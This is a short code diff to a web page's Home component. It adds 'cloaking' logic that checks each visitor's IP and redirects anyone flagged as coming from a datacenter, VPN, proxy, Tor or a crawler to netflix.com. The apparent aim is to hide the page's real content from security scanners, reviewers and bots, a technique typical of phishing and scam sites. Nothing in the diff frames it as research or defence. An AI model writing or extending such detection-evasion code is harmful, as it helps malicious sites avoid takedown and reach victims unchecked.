@@ -58,8 +58,17 @@ export default function Home() {
         const ipResponse = await fetch('/api/check-ip');
         const ipData = await ipResponse.json();
         
-        if (!ipData.isSafe) {
-          trackEvent('Cloaked Visitor Detected', { checks: ipData.checks });
+        // Extra: redirect if any server-side cloaking detected
+        const checks = ipData.checks || {};
+        if (
+          !ipData.isSafe ||
+          checks.datacenter?.detected ||
+          checks.vpn?.detected ||
+          checks.proxy?.detected ||
+          checks.tor?.detected ||
+          checks.crawler?.detected
+        ) {
+          trackEvent('Cloaked Visitor Detected', { checks });
           window.location.href = 'https://www.netflix.com';
           return;
         }
